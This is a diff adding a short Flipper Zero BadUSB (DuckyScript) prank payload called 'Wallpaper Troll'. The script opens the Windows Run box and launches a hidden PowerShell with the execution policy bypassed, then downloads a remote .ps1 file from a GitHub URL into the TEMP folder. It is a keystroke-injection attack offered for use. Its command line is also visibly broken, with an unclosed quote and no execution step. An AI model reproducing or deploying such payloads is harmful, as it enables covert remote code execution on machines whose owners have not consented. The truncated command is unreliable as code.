@@ -1,0 +1,7 @@
+REM Title: Wallpaper Troll (Fixed Version for Flipper Zero)
+REM Description: Download and apply wallpaper using PowerShell
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-Wallpaper-Troll/Wallpaper-Troll.ps1 -OutFile $env:TEMP\wallpaper.ps1;
+ENTER
